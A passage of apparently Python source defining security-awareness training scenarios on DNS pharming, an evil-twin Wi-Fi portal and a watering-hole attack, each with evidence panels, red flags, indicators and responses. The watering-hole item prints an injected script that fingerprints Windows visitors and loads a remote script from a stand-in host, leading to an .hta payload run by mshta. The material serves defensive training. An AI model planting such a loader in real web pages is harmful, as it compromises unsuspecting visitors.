    T(id="ph-pharming-2", type="pharming", title="Branch router DNS changed overnight", difficulty="Hard",
      brief="Several staff at one branch saw certificate warnings on the HR portal this morning. Some clicked through.",
      panels=[
          T(type="table", title="Router config diff (branch BR-07)", columns=["Setting", "Yesterday", "Today"], rows=[["DNS primary", "198.51.100.53", "203.0.113.153"], ["DNS secondary", "198.51.100.54", "203.0.113.154"], ["Admin password changed", "—", "2026-03-19 02:14 from 203.0.113.9"], ["Firmware", "4.2.1", "4.2.1 (out of date)"]]),
          T(type="code", title="nslookup from a branch laptop", lang="text", text=f"> hr.{CO}\nServer:  203.0.113.153\nName:    hr.{CO}\nAddress: 203.0.113.80\n\n> hr.{CO} (via HQ resolver 198.51.100.53)\nAddress: 198.51.100.80"),
          T(type="browser", title="What staff saw", url=f"https://hr.{CO}/login", cert="⚠ Not secure · Issuer: 'Orbit Secure CA' (untrusted)", body="Orbit HR Portal\n[Employee ID] [Password] [Sign in]")],
      red_flags=flags(["Router DNS changed to unknown resolvers overnight", "Admin password changed at 02:14 from an external IP", "Branch resolver returns a different IP than HQ for the HR portal", "Correct URL but an untrusted certificate issuer"],
                      ["Staff typed the right URL", "The page looked normal", "Firmware version didn't change"]),
      iocs=["203.0.113.153", "203.0.113.80", "203.0.113.9"],
      response=flags(["Restore the router DNS, reset its admin password and update firmware", "Reset passwords for branch staff who signed in after 02:14", "Block the rogue resolvers and fake portal IP at the perimeter", "Check other branch routers for the same change"],
                     ["Tell staff to accept the certificate", "Clear browser caches at the branch", "Only change the router password"]),
      debrief="Router-level pharming: the URL was right but DNS was hijacked. The certificate warning was the clue. Fix the router, reset exposed credentials and sweep other branches."),
    T(id="ph-eviltwin-2", type="eviltwin", title="Hotel Wi-Fi 'staff login' at an offsite", difficulty="Medium",
      brief="During a team offsite, three laptops connected to 'Harbor-Guest'. One user entered their SSO password into a portal.",
      panels=[
          T(type="wifi", title="Wi-Fi scan (offsite venue)", networks=[
              T(ssid="Harbor-Guest", bssid="00:00:5E:00:53:10", vendor="Venue AP (enterprise)", security="WPA2 + portal", signal="-68 dBm", channel=1),
              T(ssid="Harbor-Guest", bssid="00:00:5E:00:53:99", vendor="Generic USB adapter", security="Open", signal="-35 dBm", channel=1),
              T(ssid="Harbor-Events", bssid="00:00:5E:00:53:11", vendor="Venue AP (enterprise)", security="WPA2-PSK", signal="-60 dBm", channel=6)]),
          T(type="browser", title="Captive portal", url="http://192.0.2.1/login", cert="No HTTPS", body="Harbor Guest Wi-Fi\nConference guests: sign in with your company email and password\n[Work email] [Password] [Connect]"),
          T(type="table", title="Sign-ins for the user", columns=["Time (UTC)", "IP", "Location", "Result"], rows=[["09:12", "192.0.2.77", "Venue NAT", "Success"], ["09:40", "203.0.113.44", "Unknown hosting", "Failure · MFA required"], ["09:41", "203.0.113.44", "Unknown hosting", "Failure · MFA required"]])],
      red_flags=flags(["Two 'Harbor-Guest' networks; the strongest is an open USB adapter", "Portal over plain HTTP asks for company credentials", "Failed sign-ins from a hosting IP 30 minutes later", "Rogue network is open while the real one uses WPA2"],
                      ["The venue has an events network", "MFA blocked the attempt, so no action is needed", "The portal mentions conference guests"]),
      iocs=["00:00:5E:00:53:99", "http://192.0.2.1/login", "203.0.113.44"],
      response=flags(["Reset the user's password and revoke sessions", "Block 203.0.113.44 and alert on further attempts", "Tell the venue about the rogue access point", "Require always-on VPN for staff at the offsite"],
                     ["No action — MFA stopped it", "Connect to Harbor-Guest yourself to inspect it", "Ask the user to forget the network only"]),
      debrief="Evil twin harvested a password; MFA blocked the replay but the password is burned. Reset, block, tell the venue and enforce VPN."),
    T(id="ph-watering-2", type="watering", title="Customs-forms portal serves a fake 'font update'", difficulty="Hard",
      brief="EDR flagged mshta.exe on a customs clerk's laptop after they downloaded a form from an industry portal.",
      panels=[
          T(type="code", title="Injected snippet on customs-forms.example.org", lang="html", text="<script>\nif (document.cookie.indexOf('seen=1') < 0 && /Windows/.test(navigator.userAgent)) {\n  document.cookie = 'seen=1; max-age=86400';\n  var s = document.createElement('script');\n  s.src = 'https://fontsync-cdn.test/f.js';\n  document.body.appendChild(s);\n}\n</script>"),
          T(type="table", title="Proxy + EDR timeline", columns=["Time", "Host", "Event"], rows=[
              ["10:02:11", "CUS-LT-14", "GET https://customs-forms.example.org/forms/c88"],
              ["10:02:12", "CUS-LT-14", "GET https://fontsync-cdn.test/f.js"],
              ["10:02:20", "CUS-LT-14", "Download Font_Update.hta from fontsync-cdn.test"],
              ["10:02:31", "CUS-LT-14", "mshta.exe Font_Update.hta → powershell (blocked)"],
              ["10:05:02", "CUS-LT-09", "GET https://fontsync-cdn.test/f.js"]]),
          T(type="browser", title="What the clerk saw", url="https://customs-forms.example.org/forms/c88", cert="Valid", body="The 'OrbitSans' font is missing. Install the font update to view this form. [Update font]")],
      red_flags=flags(["Trusted portal loads a script from an unrelated domain", "Script fires once per day and only for Windows visitors", "'Font update' is an .hta file run by mshta", "A second host fetched the same script minutes later"],
                      ["The portal has a valid certificate", "The form number is c88", "PowerShell was blocked"]),
      iocs=["fontsync-cdn.test", "Font_Update.hta", "https://fontsync-cdn.test/f.js"],
      response=flags(["Isolate CUS-LT-14 and check CUS-LT-09 for the download", "Block fontsync-cdn.test", "Notify the portal owner that their site is injected", "Block .hta execution via policy"],
                     ["Block the customs portal and close", "Tell the clerk to install fonts manually", "Ignore — EDR blocked PowerShell"]),
      debrief="Watering hole on a niche industry portal with a filtered, once-a-day loader. One host was blocked, a second was exposed — scope, block and notify the site owner."),
